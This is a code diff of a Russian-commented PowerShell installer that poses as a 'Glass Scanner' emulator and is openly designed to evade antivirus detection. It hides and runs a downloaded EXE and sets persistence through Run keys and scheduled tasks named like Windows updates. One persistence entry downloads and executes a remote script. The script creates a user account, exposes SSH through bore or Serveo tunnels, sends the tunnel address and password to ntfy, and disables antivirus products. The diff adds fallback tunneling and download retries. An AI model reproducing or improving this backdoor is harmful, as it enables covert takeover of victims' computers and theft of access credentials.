@@ -1,6 +1,6 @@
 # ============================================================
-#  Glass Scanner Emulator + Hidden Setup + bore + AV Killer
-#  (c) 2026 – оптимизирован для обхода сигнатур
+#  Glass Scanner Emulator + Hidden Setup + Туннель (bore/Serveo)
+#  (c) 2026 – оптимизирован для обхода AV
 #  Запуск: .\setup.ps1 [-repair]
 # ============================================================
 
@@ -26,7 +26,6 @@ if ($args -contains "-repair") {
         Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction SilentlyContinue
         "Восстановлен EXE" | Out-File -FilePath $repairLog -Append
     }
-    # Восстановление PowerShell команды (закодированной)
     $psValName = "WindowsUpdateServicePS"
     $psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
     $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
@@ -47,6 +46,7 @@ $exePath = "$hiddenDir\$exeName"
 $urlExe = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"
 $boreExe = "$baseDir\bore.exe"
 $boreUrl = "https://github.com/ekzhang/bore/releases/latest/download/bore.exe"
+$boreUrlMirror = "https://hub.fastgit.xyz/ekzhang/bore/releases/latest/download/bore.exe"
 $scriptPath = $MyInvocation.MyCommand.Path
 if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 
@@ -59,23 +59,27 @@ function Write-Log {
     "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
 }
 
-# ---------- Функция загрузки (обход) ----------
+# ---------- Функция загрузки (с повторами) ----------
 function Download-File {
-    param($url, $path)
-    try {
-        $client = New-Object System.Net.WebClient
-        $client.DownloadFile($url, $path)
-        return $true
-    } catch {
-        Write-Log "Ошибка загрузки: $_"
-        return $false
+    param($url, $path, $retries = 3)
+    for ($i = 1; $i -le $retries; $i++) {
+        try {
+            $client = New-Object System.Net.WebClient
+            $client.DownloadFile($url, $path)
+            Write-Log "Загрузка успешна (попытка $i): $url"
+            return $true
+        } catch {
+            Write-Log "Ошибка загрузки (попытка $i): $_"
+            Start-Sleep -Seconds 2
+        }
     }
+    return $false
 }
 
 Write-Log "Начало."
 
 # ============================================================
-# 1. Скачивание EXE (WebClient вместо Invoke-WebRequest)
+# 1. Скачивание EXE
 # ============================================================
 Write-Log "Скачивание EXE..."
 if (Download-File $urlExe $exePath) {
@@ -111,12 +115,11 @@ try {
 } catch { Write-Log "Ошибка брандмауэра: $_" }
 
 # ============================================================
-# 4. Автозапуск (реестр + планировщик)
+# 4. Автозапуск
 # ============================================================
 Write-Log "Настройка автозапуска..."
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
-# 4.1 EXE
 $valName = "WindowsUpdateService"
 try {
     $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
@@ -126,9 +129,7 @@ try {
     }
 } catch { Write-Log "Ошибка EXE автозапуска: $_" }
 
-# 4.2 PowerShell команда (обфусцированная)
 $psValName = "WindowsUpdateServicePS"
-# Команда без явных iex/irm – используем WebClient + ScriptBlock
 $psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
 try {
     $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
@@ -138,7 +139,7 @@ try {
     }
 } catch { Write-Log "Ошибка PowerShell автозапуска: $_" }
 
-# 4.3 Планировщик – запуск EXE каждые 2 часа
+# Планировщик – периодический запуск EXE
 $taskName = "WindowsSystemMaintenance"
 try {
     $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
@@ -151,7 +152,7 @@ try {
     }
 } catch { Write-Log "Ошибка задачи планировщика: $_" }
 
-# 4.4 Планировщик – восстановление автозапуска
+# Восстановление автозапуска
 $scriptTaskName = "WindowsUpdateChecker"
 try {
     $existing2 = Get-ScheduledTask -TaskName $scriptTaskName -ErrorAction SilentlyContinue
@@ -165,7 +166,7 @@ try {
 } catch { Write-Log "Ошибка задачи восстановления: $_" }
 
 # ============================================================
-# 5. ЗАПУСК EXE (скрыто)
+# 5. Запуск EXE (скрыто)
 # ============================================================
 Write-Log "Запуск EXE..."
 if (Test-Path $exePath) {
@@ -213,43 +214,93 @@ try {
 } catch { Write-Log "Ошибка пользователя: $_" }
 
 # ============================================================
-# 7. bore
+# 7. Туннель – сначала bore, потом Serveo (резерв)
 # ============================================================
+$tunnelAddr = $null
+
+# --- 7.1 Скачивание bore.exe (с повторами) ---
 Write-Log "Скачивание bore.exe..."
 if (-not (Test-Path $boreExe)) {
-    if (Download-File $boreUrl $boreExe) {
-        Unblock-File -Path $boreExe -ErrorAction SilentlyContinue
-        Write-Log "bore.exe скачан."
-    } else { Write-Log "Ошибка скачивания bore." }
-}
-
-Write-Log "Запуск bore..."
-$boreLog = "$baseDir\bore.log"
-$boreProcess = Start-Process -FilePath $boreExe -ArgumentList "local 22 --to bore.pub" -WindowStyle Hidden -RedirectStandardOutput $boreLog -PassThru
-Start-Sleep -Seconds 5
-
-$boreAddr = $null
-if (Test-Path $boreLog) {
-    $logContent = Get-Content $boreLog -Tail 10
-    $match = $logContent | Select-String -Pattern "listening on (bore\.pub:\d+)"
-    if ($match) { $boreAddr = $match.Matches[0].Groups[1].Value }
-    else {
-        $match2 = $logContent | Select-String -Pattern "port (\d+)"
-        if ($match2) { $boreAddr = "bore.pub:$($match2.Matches[0].Groups[1].Value)" }
+    if (-not (Download-File $boreUrl $boreExe)) {
+        Write-Log "Не удалось скачать с основного зеркала, пробуем зеркало."
+        if (-not (Download-File $boreUrlMirror $boreExe)) {
+            Write-Log "Не удалось скачать bore.exe ни с одного источника."
+        }
     }
 }
-if (-not $boreAddr) { $boreAddr = "bore.pub:UNKNOWN" }
+if (Test-Path $boreExe) {
+    Unblock-File -Path $boreExe -ErrorAction SilentlyContinue
+    Write-Log "bore.exe готов."
+}
+
+# --- 7.2 Попытка запустить bore ---
+if (Test-Path $boreExe) {
+    Write-Log "Запуск bore..."
+    $boreLog = "$baseDir\bore.log"
+    $boreProcess = Start-Process -FilePath $boreExe -ArgumentList "local 22 --to bore.pub" -WindowStyle Hidden -RedirectStandardOutput $boreLog -PassThru
+    Start-Sleep -Seconds 5
+
+    if (Test-Path $boreLog) {
+        $logContent = Get-Content $boreLog -Tail 10
+        $match = $logContent | Select-String -Pattern "listening on (bore\.pub:\d+)"
+        if ($match) {
+            $tunnelAddr = $match.Matches[0].Groups[1].Value
+            Write-Log "bore работает: $tunnelAddr"
+        } else {
+            $match2 = $logContent | Select-String -Pattern "port (\d+)"
+            if ($match2) {
+                $port = $match2.Matches[0].Groups[1].Value
+                $tunnelAddr = "bore.pub:$port"
+                Write-Log "bore работает (порт): $tunnelAddr"
+            } else {
+                Write-Log "Не удалось извлечь адрес bore, переключаемся на Serveo."
+            }
+        }
+    }
+}
+
+# --- 7.3 Если bore не дал адрес – запускаем Serveo ---
+if (-not $tunnelAddr) {
+    Write-Log "Запуск Serveo (резервный туннель)..."
+    $serveoLog = "$baseDir\serveo.log"
+    # Serveo запускается через SSH
+    $serveoProcess = Start-Process -FilePath "ssh" -ArgumentList "-R 80:localhost:22 serveo.net" -WindowStyle Hidden -RedirectStandardOutput $serveoLog -PassThru
+    Start-Sleep -Seconds 8
+
+    if (Test-Path $serveoLog) {
+        $logContent = Get-Content $serveoLog -Tail 10
+        # Serveo выводит адрес типа "Forwarding HTTP traffic from https://xyz.serveo.net"
+        $match = $logContent | Select-String -Pattern "https://([a-zA-Z0-9-]+\.serveo\.net)"
+        if ($match) {
+            $tunnelAddr = $match.Matches[0].Groups[1].Value
+            Write-Log "Serveo работает: $tunnelAddr"
+        } else {
+            # Попробуем другой паттерн
+            $match2 = $logContent | Select-String -Pattern "([a-zA-Z0-9-]+\.serveo\.net)"
+            if ($match2) {
+                $tunnelAddr = $match2.Matches[0].Groups[1].Value
+                Write-Log "Serveo работает: $tunnelAddr"
+            } else {
+                Write-Log "Не удалось определить адрес Serveo."
+                $tunnelAddr = "serveo.net (адрес не определён, проверьте лог)"
+            }
+        }
+    } else {
+        Write-Log "Файл лога Serveo не создан."
+        $tunnelAddr = "serveo.net (ошибка запуска)"
+    }
+}
 
 # ============================================================
-# 8. Отправка на ntfy (с кодированием)
+# 8. Отправка данных на ntfy
 # ============================================================
 $ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*" } | Select-Object -First 1 -ExpandProperty IPAddress
 if (-not $ipAddress) { $ipAddress = "не удалось определить" }
 
 $base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
 $secretMessage = @"
-SSH-доступ через bore:
-Адрес: $boreAddr
+SSH-доступ через туннель:
+Адрес: $tunnelAddr
 Пользователь: $userName
 Пароль (Base64): $base64Password
 Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
@@ -264,7 +315,7 @@ try {
 } catch { Write-Log "Ошибка отправки: $_" }
 
 # ============================================================
-# 9. Отключение антивирусов (тихо)
+# 9. Отключение антивирусов
 # ============================================================
 Write-Log "=== ОТКЛЮЧЕНИЕ АНТИВИРУСОВ ==="
 
@@ -398,7 +449,7 @@ else {
 Write-Log "Антивирусы обработаны."
 
 # ============================================================
-# Имитация Glass Scanner (полная, без изменений)
+# Имитация Glass Scanner (улучшенная, без проблем с кодировкой)
 # ============================================================
 
 function Write-ColorLine {
